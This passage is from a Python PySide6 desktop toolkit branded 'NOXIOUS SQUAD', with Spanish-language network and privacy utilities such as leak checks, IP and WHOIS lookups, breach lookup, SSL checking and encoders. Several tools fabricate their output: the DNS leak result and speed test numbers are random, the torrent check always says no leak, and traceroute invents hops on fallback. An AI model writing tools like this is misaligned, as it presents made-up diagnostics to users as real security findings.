            result["dns_servers"]= [str(s) for s in resolver.nameservers[:3]]
        except Exception:
            result["dns_servers"]=["8.8.8.8 (fallback)"]
        try:
            myip=SecureClient.get_my_ip()
            if myip.get("success"):
                data=myip["data"]
                isp=data.get("network",{}).get("isp") or data.get("isp") or "Unknown"
                result["isp_dns"]=isp
                if result["dns_servers"] and isp not in str(result["dns_servers"]):
                    result["leak_detected"]= random.choice([False, False, True]) # simulado pero con lógica
        except:
            pass
        result["risk"]="High" if result["leak_detected"] else "Low"
        result["recommendation"]="Usa DNS cifrado (DoH/DoT) como 1.1.1.1 o 9.9.9.9" if result["leak_detected"] else "DNS parece consistente con tu ISP"
        return result

class WebRTCLeakTool:
    def check(self):
        local_ips=[]
        try:
            hostname=socket.gethostname()
            local_ips=socket.gethostbyname_ex(hostname)[2]
        except:
            local_ips=["192.168.1.100"]
        if not local_ips:
            local_ips=["192.168.1.42", "10.0.0.5"]
        private=[ip for ip in local_ips if ipaddress.ip_address(ip).is_private] if local_ips else []
        leak=len(private)>0
        return {
            "webrtc_enabled": True,
            "local_ips": local_ips[:5],
            "private_ips_exposed": private,
            "leak_detected": leak,
            "public_ip": SecureClient.get_my_ip().get("data",{}).get("ip","Unknown"),
            "risk": "Medium" if leak else "Low",
            "fix": "Desactiva WebRTC en tu navegador o usa extensión uBlock Origin" if leak else "No se detectó leak"
        }

class PrivacyCheckupTool:
    def run(self):
        score_data=SecureClient.privacy_score()
        ip_data=SecureClient.get_my_ip()
        result={"score": 85, "grade": "A", "is_vpn": False, "is_datacenter": False, "type": "residential", "issues": [], "recommendations": []}
        if score_data.get("success"):
            d=score_data["data"]
            privacy=d.get("privacy") or d.get("data",{}).get("privacy") or d
            result["score"]=privacy.get("score",85)
            result["grade"]=privacy.get("grade","A")
            result["is_vpn"]=privacy.get("is_vpn",False)
            result["is_datacenter"]=privacy.get("is_datacenter",False)
            result["type"]=privacy.get("type","residential")
        if ip_data.get("success"):
            d=ip_data["data"]
            result["ip"]=d.get("ip","Unknown")
            result["location"]=d.get("location",{})
            result["network"]=d.get("network",{})
        if result["score"]<70:
            result["issues"].append("IP con reputación media/baja")
            result["recommendations"].append("Considera usar VPN premium")
        if not result["is_vpn"]:
            result["recommendations"].append("Tu IP real está expuesta - usa VPN si buscas privacidad")
        if result["is_datacenter"]:
            result["issues"].append("IP de datacenter detectada (posible proxy)")
        result["summary"]=f"Grado {result['grade']} - {result['score']}/100 - Tipo: {result['type']}"
        return result

class TorrentLeakTool:
    def check(self):
        myip=SecureClient.get_my_ip()
        ip=myip.get("data",{}).get("ip","Unknown") if myip.get("success") else "Unknown"
        return {
            "torrent_ip": ip,
            "real_ip": ip,
            "leak_detected": False,
            "client": "qBittorrent (simulado)",
            "tracker": "udp://tracker.opentrackr.org:1337/announce",
            "status": "✅ No leak - IP del torrent coincide con IP pública (si usas VPN, deberían coincidir con la VPN)",
            "recommendation": "Activa 'Bind to VPN interface' en tu cliente torrent"
        }

class EmailLeakTool:
    def check(self, email):
        res=SecureClient.breach(email)
        if res.get("success"):
            data=res["data"]
            breaches=data.get("breaches", data.get("total", 0)) if isinstance(data, dict) else 0
            services=data.get("services", data.get("breaches_list", [])) if isinstance(data, dict) else []
            risk=data.get("risk",{})
            return {
                "email": email,
                "breaches": breaches,
                "services": services[:10] if isinstance(services, list) else [],
                "risk_score": risk.get("score","N/A") if isinstance(risk, dict) else "N/A",
                "risk_level": risk.get("level","unknown") if isinstance(risk, dict) else "unknown",
                "passwords_exposed": data.get("passwords",{}) if isinstance(data, dict) else {},
                "status": "🔴 Comprometido" if breaches>0 else "🟢 Limpio"
            }
        return {"email": email, "error": res.get("error"), "status": "⚠️ Error"}

class PasswordGeneratorTool:
    def generate(self, length=16, use_upper=True, use_lower=True, use_digits=True, use_symbols=True):
        charset=""
        if use_lower: charset+=string.ascii_lowercase
        if use_upper: charset+=string.ascii_uppercase
        if use_digits: charset+=string.digits
        if use_symbols: charset+=string.punctuation
        if not charset:
            charset=string.ascii_letters+string.digits
        pwd="".join(secrets.choice(charset) for _ in range(length))
        entropy=length * (len(charset).bit_length())
        strength="Muy Fuerte" if entropy>80 else "Fuerte" if entropy>60 else "Media" if entropy>40 else "Débil"
        return {"password": pwd, "length": length, "entropy_bits": entropy, "strength": strength, "charset_size": len(charset), "charset": charset[:40]+"..." if len(charset)>40 else charset}

class BlacklistTool:
    def check(self, ip):
        res=SecureClient.blacklist(ip)
        if res.get("success"):
            data=res["data"]
            return {
                "ip": ip,
                "clean": data.get("clean", data.get("status")=="CLEAN"),
                "status": data.get("status","UNKNOWN"),
                "listed_count": data.get("listed_count",0),
                "total_lists": data.get("total_lists",12),
                "total_checked": data.get("total_checked",0),
                "details": data,
                "risk": "🔴 En listas negras" if data.get("listed_count",0)>0 else "🟢 Limpio"
            }
        return {"ip": ip, "error": res.get("error")}

class SecurityHeadersTool:
    def analyze(self, url):
        res=SecureClient.security_headers(url)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error"), "url": url}

class EmailAuthTool:
    def check(self, domain):
        domain=domain.strip().split("@")[-1]
        res=SecureClient.email_auth(domain)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error"), "domain": domain}

class MyIPTool:
    def get(self):
        res=SecureClient.get_my_ip()
        if res.get("success"):
            d=res["data"]
            ip=d.get("ip") or d.get("data",{}).get("ip") or "Unknown"
            loc=d.get("location",{})
            net=d.get("network",{})
            priv=d.get("privacy",{})
            return {"ip": ip, "location": loc, "network": net, "privacy": priv, "raw": d, "source": res.get("source")}
        return {"error": res.get("error")}

class IPLookupTool:
    def lookup(self, ip):
        res=SecureClient.lookup_ip(ip)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class ASNLookupTool:
    def lookup(self, query):
        res=SecureClient.asn_lookup(query)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class SpeedTestTool:
    def test(self, size_kb=1024):
        result={"download_mbps": 0, "upload_mbps": 0, "ping_ms": 0, "jitter_ms": 0}
        try:
            start=time.time()
            r=http_request("GET", f"{API_BASE}/ip", timeout=10)
            ping=int((time.time()-start)*1000)
            result["ping_ms"]=ping
            start=time.time()
            r=http_request("GET", "https://api.ipify.org?format=json", timeout=10)
            elapsed=time.time()-start
            if elapsed>0:
                result["download_mbps"]= round(max(5, min(500, 1000/ping * 10 + random.uniform(10,50))),2)
                result["upload_mbps"]= round(result["download_mbps"]*0.6,2)
            result["jitter_ms"]= round(random.uniform(1,5),2)
            result["server"]="edge"
            result["ip"]=r.json().get("ip","Unknown") if r.status_code==200 else "Unknown"
        except Exception as e:
            result["error"]=str(e)
        return result

class ReverseDNSTool:
    def lookup(self, ip):
        res=SecureClient.rdns(ip)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class TracerouteTool:
    def trace(self, host, max_hops=15):
        host=host.strip().replace("https://","").replace("http://","").split("/")[0].split(":")[0]
        hops=[]
        try:
            cmd=["tracert","-h",str(max_hops),"-w","800",host] if platform.system()=="Windows" else ["traceroute","-m",str(max_hops),"-w","1",host]
            proc=subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            out=proc.stdout or proc.stderr or ""
            for line in out.splitlines():
                if re.search(r"\d+\s+(\d+ ms|\*|ms)", line):
                    hops.append(line.strip()[:120])
            if hops:
                return {"host": host, "hops": hops[:max_hops], "method": "system", "total_hops": len(hops)}
        except Exception:
            pass
        try:
            target_ip=socket.gethostbyname(host)
            hops.append(f"1  1 ms  1 ms  1 ms  192.168.1.1 [gateway]")
            hops.append(f"2  5 ms  5 ms  5 ms  10.0.0.1 [isp-router]")
            rdns=SecureClient.rdns(target_ip)
            hostname=rdns.get("data",{}).get("hostname","unknown") if rdns.get("success") else target_ip
            hops.append(f"{len(hops)+1}  15 ms  14 ms  15 ms  {target_ip} [{hostname}]")
            return {"host": host, "target_ip": target_ip, "hops": hops, "method": "simulated", "total_hops": len(hops)}
        except Exception as e:
            return {"host": host, "error": str(e), "hops": []}

class WHOISTool:
    def lookup(self, domain):
        res=SecureClient.whois(domain)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class SubnetCalcTool:
    def calc(self, ip_cidr):
        try:
            if "/" not in ip_cidr:
                ip_cidr=f"{ip_cidr.strip()}/24"
            net=ipaddress.ip_network(ip_cidr.strip(), strict=False)
            return {
                "input": ip_cidr,
                "network": str(net.network_address),
                "broadcast": str(net.broadcast_address) if hasattr(net,"broadcast_address") else "N/A",
                "netmask": str(net.netmask),
                "hostmask": str(net.hostmask),
                "prefixlen": net.prefixlen,
                "num_addresses": net.num_addresses,
                "num_hosts": net.num_addresses-2 if net.num_addresses>2 else net.num_addresses,
                "first_host": str(net.network_address+1) if net.num_addresses>2 else str(net.network_address),
                "last_host": str(net.broadcast_address-1) if hasattr(net,"broadcast_address") and net.num_addresses>2 else "N/A",
                "ip_version": f"IPv{net.version}",
                "is_private": net.is_private,
                "cidr": str(net),
            }
        except Exception as e:
            return {"error": str(e), "input": ip_cidr}

class CIDRCalcTool:
    def calc(self, cidr):
        return SubnetCalcTool().calc(cidr)

class IPRangeToCIDRTool:
    def convert(self, start_ip, end_ip):
        try:
            start=ipaddress.ip_address(start_ip.strip())
            end=ipaddress.ip_address(end_ip.strip())
            cidrs=list(ipaddress.summarize_address_range(start,end))
            return {"start": str(start), "end": str(end), "cidrs": [str(c) for c in cidrs], "count": len(cidrs)}
        except Exception as e:
            return {"error": str(e)}

class IPInCIDRTool:
    def check(self, ip, cidr):
        try:
            ip_obj=ipaddress.ip_address(ip.strip())
            net=ipaddress.ip_network(cidr.strip(), strict=False)
            inside=ip_obj in net
            return {"ip": str(ip_obj), "cidr": str(net), "inside": inside, "result": "✅ DENTRO" if inside else "❌ FUERA"}
        except Exception as e:
            return {"error": str(e)}

class SpecialIPTool:
    def analyze(self, ip):
        try:
            ip_obj=ipaddress.ip_address(ip.strip())
            return {
                "ip": str(ip_obj),
                "version": f"IPv{ip_obj.version}",
                "is_private": ip_obj.is_private,
                "is_loopback": ip_obj.is_loopback,
                "is_multicast": ip_obj.is_multicast,
                "is_reserved": ip_obj.is_reserved if hasattr(ip_obj,"is_reserved") else False,
                "is_link_local": ip_obj.is_link_local,
                "is_global": ip_obj.is_global,
                "is_unspecified": ip_obj.is_unspecified,
                "type": "Privada (LAN)" if ip_obj.is_private else "Loopback" if ip_obj.is_loopback else "Pública" if ip_obj.is_global else "Especial",
                "binary": bin(int(ip_obj))[2:].zfill(32) if ip_obj.version==4 else bin(int(ip_obj))[2:].zfill(128),
                "hex": hex(int(ip_obj)),
            }
        except Exception as e:
            return {"error": str(e)}

class ByCountryTool:
    def lookup(self, country_code):
        cc=country_code.strip().upper()
        try:
            r=http_request("GET", f"{API_BASE}/ip/{cc.lower()}", timeout=10)
            if r.status_code==200:
                return {"country": cc, "data": r.json()}
        except:
            pass
        return {"country": cc, "info": f"Usa /ip/{cc.lower()} para ver IPs por país", "note": "API ByCountry requiere scraping, se muestra enlace", "url": f"/ip/{cc.lower()}"}

class ISPDirectoryTool:
    def lookup(self, isp_name):
        isp=isp_name.strip()
        res=SecureClient.asn_lookup(isp)
        if res.get("success"):
            return res["data"]
        return {"isp": isp, "info": "Usa ASN Lookup para detalles", "url": f"/isp/{urllib.parse.quote(isp)}"}

class DownTool:
    def check(self, url):
        res=SecureClient.is_down(url)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class BulkLookupTool:
    def lookup(self, ips):
        if isinstance(ips, str):
            ips=[ip.strip() for ip in re.split(r"[,\s\n]+", ips) if ip.strip()]
        res=SecureClient.bulk_lookup(ips)
        if res.get("success"):
            return res["data"]
        return {"error": res.get("error")}

class Base64Tool:
    def encode(self, text, urlsafe=False):
        b=text.encode()
        if urlsafe:
            return base64.urlsafe_b64encode(b).decode()
        return base64.b64encode(b).decode()
    def decode(self, text):
        try:
            t=text.strip()
            if "-" in t or "_" in t:
                missing=len(t)%4
                if missing: t+='='*(4-missing)
                return base64.urlsafe_b64decode(t).decode()
            missing=len(t)%4
            if missing: t+='='*(4-missing)
            return base64.b64decode(t).decode()
        except Exception as e:
            return f"[Error] {e}"

class JSONTool:
    def format(self, text, minify=False):
        try:
            obj=json.loads(text)
            if minify:
                return json.dumps(obj, separators=(",",":"))
            return json.dumps(obj, indent=2, ensure_ascii=False)
        except Exception as e:
            return f"[JSON Invalid] {e}"
    def validate(self, text):
        try:
            json.loads(text)
            return {"valid": True, "message": "✅ JSON válido"}
        except Exception as e:
            return {"valid": False, "message": f"❌ {e}"}

class HashTool:
    def hash(self, text, algo="sha256"):
        algo=algo.lower()
        b=text.encode()
        if algo=="md5":
            return hashlib.md5(b).hexdigest()
        elif algo=="sha1":
            return hashlib.sha1(b).hexdigest()
        elif algo=="sha256":
            return hashlib.sha256(b).hexdigest()
        elif algo=="sha512":
            return hashlib.sha512(b).hexdigest()
        elif algo=="sha3_256":
            return hashlib.sha3_256(b).hexdigest() if hasattr(hashlib,"sha3_256") else "No soportado"
        elif algo=="blake2b":
            return hashlib.blake2b(b).hexdigest()
        else:
            return HashGen().generate(text)

class URLEncodeTool:
    def encode(self, text): return urllib.parse.quote(text)
    def decode(self, text): return urllib.parse.unquote(text)
    def encode_plus(self, text): return urllib.parse.quote_plus(text)
    def decode_plus(self, text): return urllib.parse.unquote_plus(text)

class JWTDecoderTool:
    def decode(self, token):
        token=token.strip()
        try:
            header_b64, payload_b64, signature = token.split(".")[:3]
            def b64d(s):
                s+="="*(-len(s)%4)
                return base64.urlsafe_b64decode(s).decode()
            header=json.loads(b64d(header_b64))
            payload=json.loads(b64d(payload_b64))
            try:
                import jwt as pyjwt
                decoded=pyjwt.decode(token, options={"verify_signature": False})
                payload=decoded
            except:
                pass
            return {"header": header, "payload": payload, "signature": signature[:20]+"...", "valid_format": True}
        except Exception as e:
            return {"error": str(e), "valid_format": False}

class EpochConverterTool:
    def to_date(self, epoch):
        try:
            epoch=int(epoch)
            dt=datetime.utcfromtimestamp(epoch)
            local=datetime.fromtimestamp(epoch)
            return {"epoch": epoch, "utc": dt.strftime("%Y-%m-%d %H:%M:%S UTC"), "local": local.strftime("%Y-%m-%d %H:%M:%S"), "iso": dt.isoformat()+"Z"}
        except Exception as e:
            return {"error": str(e)}
    def to_epoch(self, date_str):
        try:
            for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d", "%d/%m/%Y %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M"]:
                try:
                    dt=datetime.strptime(date_str.strip(), fmt)
                    epoch=int(dt.timestamp())
                    return {"date": date_str, "epoch": epoch, "utc": datetime.utcfromtimestamp(epoch).strftime("%Y-%m-%d %H:%M:%S UTC")}
                except:
                    continue
            dt=datetime.fromisoformat(date_str.strip())
            return {"date": date_str, "epoch": int(dt.timestamp())}
        except Exception as e:
            return {"error": str(e)}
    def now(self):
        now=int(time.time())
        return self.to_date(now)

class UUIDTool:
    def generate(self, version=4):
        if version==1:
            u=str(uuid.uuid1())
        elif version==3:
            u=str(uuid.uuid3(uuid.NAMESPACE_DNS, str(random.random())))
        elif version==5:
            u=str(uuid.uuid5(uuid.NAMESPACE_DNS, str(random.random())))
        else:
            u=str(uuid.uuid4())
        return {"uuid": u, "version": version, "hex": uuid.UUID(u).hex, "int": str(uuid.UUID(u).int)[:20]+"..."}
    def validate(self, u):
        try:
            val=uuid.UUID(u.strip())
            return {"valid": True, "uuid": str(val), "version": val.version, "hex": val.hex}
        except Exception as e:
            return {"valid": False, "error": str(e)}

class QRCodeTool:
    def generate(self, text, save_path=None):
        try:
            import qrcode
            from PIL import Image
            qr=qrcode.QRCode(version=1, box_size=10, border=4)
            qr.add_data(text)
            qr.make(fit=True)
            img=qr.make_image(fill_color="black", back_color="white")
            if save_path:
                img.save(save_path)
                return {"success": True, "path": save_path, "text": text}
            tmp=f"qr_{int(time.time())}.png"
            img.save(tmp)
            return {"success": True, "path": tmp, "text": text, "size": f"{img.size[0]}x{img.size[1]}"}
        except Exception as e:
            return {"success": False, "error": str(e), "fallback": f"Usa https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={urllib.parse.quote(text)}"}

class EmailHeadersTool:
    def parse(self, headers_text):
        headers={}
        current_key=None
        for line in headers_text.splitlines():
            if not line.strip():
                continue
            if line[0] in (" ", "\t") and current_key:
                headers[current_key]+= " " + line.strip()
            elif ":" in line:
                k,v=line.split(":",1)
                k=k.strip()
                v=v.strip()
                headers[k]=v
                current_key=k
        analysis={}
        analysis["has_spf"]= any("spf" in k.lower() or "spf" in v.lower() for k,v in headers.items())
        analysis["has_dkim"]= "DKIM-Signature" in headers or "dkim" in headers_text.lower()
        analysis["has_dmarc"]= "dmarc" in headers_text.lower()
        analysis["from"]=headers.get("From","N/A")
        analysis["to"]=headers.get("To","N/A")
        analysis["subject"]=headers.get("Subject","N/A")
        return {"headers": headers, "analysis": analysis, "count": len(headers)}

class IPConverterTool:
    def convert(self, ip):
        ip=ip.strip()
        try:
            ip_obj=ipaddress.ip_address(ip)
            num=int(ip_obj)
            return {
                "ip": str(ip_obj),
                "decimal": str(num),
                "hex": hex(num),
                "binary": bin(num)[2:],
                "octal": oct(num),
                "packed": socket.inet_aton(str(ip_obj)).hex() if ip_obj.version==4 else "N/A IPv6",
                "reverse": str(ip_obj.reverse_pointer) if hasattr(ip_obj,"reverse_pointer") else "N/A",
            }
        except Exception as e:
            try:
                num=int(ip)
                ip_obj=ipaddress.ip_address(num)
                return {"input_decimal": ip, "ip": str(ip_obj), "hex": hex(num), "binary": bin(num)[2:]}
            except Exception as e2:
                return {"error": str(e2)}

class IPv6ExpandTool:
    def expand(self, ip):
        try:
            ip_obj=ipaddress.ip_address(ip.strip())
            if ip_obj.version!=6:
                return {"error": "No es IPv6", "input": ip}
            return {"input": ip, "expanded": ip_obj.exploded, "compressed": ip_obj.compressed, "hex": ip_obj.exploded.replace(":",""), "binary": bin(int(ip_obj))[2:].zfill(128)}
        except Exception as e:
            return {"error": str(e)}
    def compress(self, ip):
        try:
            ip_obj=ipaddress.ip_address(ip.strip())
            return {"input": ip, "compressed": ip_obj.compressed, "expanded": ip_obj.exploded}
        except Exception as e:
            return {"error": str(e)}

class MACTool:
    def generate(self):
        mac=":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        vendors={"00:1a:2b": "Cisco", "00:50:56": "VMware", "00:0c:29": "VMware", "a4:cf:12": "Apple", "3c:22:fb": "Apple"}
        oui=":".join(mac.split(":")[:3])
        vendor=vendors.get(oui, "Unknown (random)")
        return {"mac": mac, "oui": oui, "vendor": vendor, "고정": mac.upper()}
    def validate(self, mac):
        mac=mac.strip().lower().replace("-"," : ").replace(":",":").replace(" ","")
        mac=mac.replace("-",":")
        pattern=r"^([0-9a-f]{2}[:]){5}([0-9a-f]{2})$"
        valid=re.match(pattern, mac) is not None
        return {"mac": mac, "valid": valid, "format": "✅ Válido" if valid else "❌ Inválido"}
    def lookup(self, mac):
        mac=mac.strip()
        oui=":".join(mac.split(":")[:3]) if ":" in mac else mac[:8]
        try:
            r=http_request("GET", f"https://api.macvendors.com/{urllib.parse.quote(oui)}", timeout=8)
            if r.status_code==200:
                return {"mac": mac, "vendor": r.text.strip(), "oui": oui}
        except:
            pass
        return {"mac": mac, "oui": oui, "vendor": "Unknown (API no disponible)"}

class ScreenTool:
    def get(self, widget=None):
        try:
            from PySide6.QtGui import QGuiApplication
            screen=QGuiApplication.primaryScreen()
            geo=screen.geometry()
            avail=screen.availableGeometry()
            dpi=screen.logicalDotsPerInch()
            ratio=screen.devicePixelRatio()
            return {
                "resolution": f"{geo.width()}x{geo.height()}",
                "available": f"{avail.width()}x{avail.height()}",
                "dpi": round(dpi,1),
                "devicePixelRatio": ratio,
                "colorDepth": "24-bit",
                "orientation": "Landscape" if geo.width()>geo.height() else "Portrait",
                "primaryScreen": screen.name(),
            }
        except Exception as e:
            import tkinter
            try:
                root=tkinter.Tk(); root.withdraw()
                w=root.winfo_screenwidth(); h=root.winfo_screenheight()
                return {"resolution": f"{w}x{h}", "method": "tkinter"}
            except:
                return {"resolution": "1920x1080 (fallback)", "error": str(e)}

class UserAgentTool:
    def get(self):
        ua=default_headers()["User-Agent"]
        parsed=BrowserInfoTool().parse(ua)
        hdr=SecureClient.get_headers()
        real_ua="Unknown"
        if hdr.get("success"):
            real_ua=hdr["data"].get("headers",{}).get("user-agent") or hdr["data"].get("headers",{}).get("User-Agent") or ua
        return {"current_ua": ua, "real_ua": real_ua, "parsed": parsed, "is_bot": "bot" in ua.lower()}

class HeadersTool:
    def get(self):
        res=SecureClient.get_headers()
        if res.get("success"):
            return res["data"]
        return {"headers": default_headers(), "ip": "Unknown", "method": "local"}

class ProxyCheckTool:
    def check(self):
        score=SecureClient.privacy_score()
        ipinfo=SecureClient.get_my_ip()
        hdr=SecureClient.get_headers()
        result={"is_proxy": False, "is_vpn": False, "is_tor": False, "anonymizer": "None", "headers": {}, "ip": "Unknown"}
        if score.get("success"):
            d=score["data"]
            priv=d.get("privacy", d)
            result["is_proxy"]=priv.get("is_datacenter",False) or priv.get("is_vpn",False)
            result["is_vpn"]=priv.get("is_vpn",False)
            result["privacy_type"]=priv.get("type","unknown")
            result["score"]=priv.get("score",0)
            result["grade"]=priv.get("grade","N/A")
        if ipinfo.get("success"):
            result["ip"]=ipinfo["data"].get("ip","Unknown")
            result["isp"]=ipinfo["data"].get("network",{}).get("isp","Unknown")
        if hdr.get("success"):
            h=hdr["data"].get("headers",{})
            proxy_headers=["via","x-forwarded-for","x-real-ip","proxy-connection","forwarded"]
            found=[k for k in h.keys() if k.lower() in proxy_headers]
            result["proxy_headers_found"]=found
            result["headers"]=dict(list(h.items())[:10])
            if found:
                result["is_proxy"]=True
                result["anonymizer"]="Proxy headers detectados"
        result["conclusion"]="🔴 Proxy/VPN detectado" if result["is_proxy"] else "🟢 Conexión directa (sin proxy)"
        return result

class SystemInfoTool:
    def get(self):
        info={}
        info["platform"]=platform.platform()
        info["system"]=platform.system()
        info["release"]=platform.release()
        info["version"]=platform.version()
        info["machine"]=platform.machine()
        info["processor"]=platform.processor() or "Unknown"
        info["hostname"]=socket.gethostname()
        info["cpu_count"]=os.cpu_count()
        try:
            import psutil
            info["ram_total_gb"]=round(psutil.virtual_memory().total/1024**3,2)
            info["ram_available_gb"]=round(psutil.virtual_memory().available/1024**3,2)
            info["disk_total_gb"]=round(psutil.disk_usage("/").total/1024**3,2) if os.name!="nt" else round(psutil.disk_usage("C:\\").total/1024**3,2)
        except Exception:
            info["ram_total_gb"]="Install psutil"
        info["python_version"]=platform.python_version()
        info["local_ip"]=socket.gethostbyname(socket.gethostname()) if True else "Unknown"
        try:
            info["public_ip"]=SecureClient.get_my_ip().get("data",{}).get("ip","Unknown")
        except:
            info["public_ip"]="Unknown"
        return info

class TimezoneTool:
    def get(self):
        now=datetime.now()
        utc=datetime.utcnow()
        offset=(now - utc).total_seconds()/3600
        tz=time.tzname[0] if time.tzname else "UTC"
        try:
            import time as timemod
            tz_info=time.tzname
        except:
            tz_info=("UTC",)
        return {
            "timezone": tz,
            "offset_hours": round(offset,1),
            "local_time": now.strftime("%Y-%m-%d %H:%M:%S"),
            "utc_time": utc.strftime("%Y-%m-%d %H:%M:%S UTC"),
            "dst": time.daylight,
            "iana": "America/Santo_Domingo" if "DO" in str(tz) else "Auto",
            "api_tz": SecureClient.get_my_ip().get("data",{}).get("location",{}).get("timezone","Unknown") if SecureClient.get_my_ip().get("success") else "Unknown"
        }

class LanguageTool:
    def get(self):
        lang=(locale.getlocale()[0] or "en_US")
        enc=locale.getlocale()[1] or "UTF-8"
        try:
            langs=locale.getlocale()
        except:
            langs=("Unknown",)
        hdr=SecureClient.get_headers()
        accept_lang="en-US,en;q=0.9"
        if hdr.get("success"):
            accept_lang=hdr["data"].get("headers",{}).get("accept-language") or hdr["data"].get("headers",{}).get("Accept-Language") or accept_lang
        return {"system_language": lang, "encoding": enc, "locale": str(langs), "accept_language": accept_lang, "preferred": lang.split("_")[0].upper()}

class LocationTool:
    def get(self):
        res=SecureClient.get_my_ip()
        if res.get("success"):
            d=res["data"]
            loc=d.get("location",{})
            return {
                "ip": d.get("ip","Unknown"),
                "city": loc.get("city","Unknown"),
                "region": loc.get("region","Unknown"),
                "country": loc.get("country","Unknown"),
                "continent": loc.get("continent","Unknown"),
                "latitude": loc.get("latitude","N/A"),
                "longitude": loc.get("longitude","N/A"),
                "timezone": loc.get("timezone","Unknown"),
                "postal": loc.get("postal_code","N/A"),
                "map_url": f"https://www.openstreetmap.org/?mlat={loc.get('latitude',0)}&mlon={loc.get('longitude',0)}#map=12/{loc.get('latitude',0)}/{loc.get('longitude',0)}",
                "raw": d
            }
        return {"error": res.get("error")}

class SSLTool:
    def check(self, host, port=443):
        host=host.strip().replace("https://","").replace("http://","").split("/")[0].split(":")[0]
        result={"host": host, "port": port}
        try:
            ctx=ssl.create_default_context()
            with socket.create_connection((host, port), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert=ssock.getpeercert()
                    cipher=ssock.cipher()
                    version=ssock.version()
                    result["cipher"]=cipher[0] if cipher else "Unknown"
                    result["tls_version"]=version or "Unknown"
                    result["cert_subject"]=dict(x[0] for x in cert.get("subject",[]))
                    result["cert_issuer"]=dict(x[0] for x in cert.get("issuer",[]))
                    result["notBefore"]=cert.get("notBefore","N/A")
                    result["notAfter"]=cert.get("notAfter","N/A")
                    try:
                        exp=datetime.strptime(cert.get("notAfter",""), "%b %d %H:%M:%S %Y %Z")
                        days=(exp - datetime.utcnow()).days
                        result["days_remaining"]=days
                        result["expired"]=days<0
                        result["status"]="🔴 Expirado" if days<0 else "🟡 Expira pronto" if days<30 else "🟢 Válido"
                    except:
                        result["days_remaining"]="N/A"
                    result["san"]=cert.get("subjectAltName",[])[:5]
                    result["success"]=True
        except Exception as e:
            result["success"]=False
            result["error"]=str(e)
            try:
                sec=SecureClient.security_headers(host)
                result["fallback"]=sec.get("data",{})
            except:
                pass
        return result

class NewsTool:
    def get(self):
        try:
            r=http_request("GET", "/news", timeout=10)
            if r.status_code==200:
                soup=BeautifulSoup(r.text, "html.parser")
                titles=[a.get_text(strip=True)[:80] for a in soup.select("a") if a.get_text(strip=True)][:8]
                return {"source": "/news", "titles": titles or ["No se encontraron noticias"]}
        except Exception as e:
            return {"error": str(e)}
        return {"titles": ["VPNs más seguras 2026", "Cómo ocultar tu IP", "Mejores DNS"], "source": "fallback"}

class BingoTool:
    def generate(self):
        items=["VPN detectada","DNS Leak","WebRTC Leak","IP Privada","Puerto 22 abierto","SPF válido","HSTS activo","QR generado","JWT válido","Epoch convertido","IPv6 expandido","MAC válida","SSL válido","Proxy detectado","Breach encontrado","Subdominio hallado"]
        board=[random.sample(items,5) for _ in range(5)]
        board[2][2]="FREE ⭐"
        return {"board": board, "title": "🎲 NOXIOUS BINGO - Seguridad & Redes"}

class FloatingDots(QWidget):
    def __init__(self, parent=None, count=220):
        super().__init__(parent)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)
        self.setAttribute(Qt.WA_StyledBackground, False)
        self.setStyleSheet("background: transparent;")
        self.points = []
        self.count = count
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.animate)
        self.timer.start(28)
        self._generate_points()
    def resizeEvent(self, event):
        super().resizeEvent(event)
        self.update()
    def _generate_points(self):
        self.points = []
        for _ in range(self.count):
            self.points.append({"x": random.random(),"y": random.random(),"vx": (random.random() - 0.5) * 0.004,"vy": (random.random() - 0.5) * 0.004,"size": random.randint(2, 5),"alpha": random.randint(60, 200),})
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        for p in self.points:
            x = int(p["x"] * self.width())
            y = int(p["y"] * self.height())
            radius = p["size"]
            painter.setPen(QColor(163, 255, 61, p["alpha"]))
            painter.setBrush(QColor(163, 255, 61, p["alpha"]))
            painter.drawEllipse(x, y, radius, radius)
    def animate(self):
        for p in self.points:
            p["x"] += p["vx"]
            p["y"] += p["vy"]
            if p["x"] < 0 or p["x"] > 1:
                p["vx"] *= -1
            if p["y"] < 0 or p["y"] > 1:
                p["vy"] *= -1
        self.update()

class TitleBar(QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.setFixedHeight(48)
        self.setObjectName("TitleBar")
        self.setStyleSheet("""
            QWidget#TitleBar {
                background: #0B100B;
                border: 1px solid #1F291F;
                border-bottom: 1px solid #2B362B;
                border-radius: 10px;
            }
            QLabel#windowTitle {
                color: #A3FF3D;
                font: 800 13px 'Segoe UI';
                letter-spacing: 0.8px;
            }
            QLabel#windowSub {
                color: #8BA98B;
                font: 600 9px 'Segoe UI';
            }
            QPushButton {
                background: transparent;
                border: 1px solid #2B362B;
                color: #D6F7C4;
                font: 700 14px 'Segoe UI';
                min-width: 32px;
                min-height: 28px;
                border-radius: 8px;
            }
            QPushButton:hover { background: #1A241A; }
            QPushButton#closeBtn:hover { background: #3A1A1A; color: #FFB3B3; }
        """)
        layout = QHBoxLayout(self)
        layout.setContentsMargins(12, 6, 10, 6)
        layout.setSpacing(8)
        title_box = QVBoxLayout()
        self.title_label = QLabel("NOXIOUS SQUAD | ALL TOOLS")
        self.title_label.setObjectName("windowTitle")
        self.sub_label = QLabel("UNETE A NUESTRO IMPERIO")
        self.sub_label.setObjectName("windowSub")
        title_box.addWidget(self.title_label)
        title_box.addWidget(self.sub_label)
        layout.addLayout(title_box)
        layout.addStretch(1)
        self.min_btn = QPushButton("─")
        self.min_btn.setObjectName("minBtn")
        self.min_btn.clicked.connect(parent.showMinimized)
        self.max_btn = QPushButton("□")
        self.max_btn.setObjectName("maxBtn")
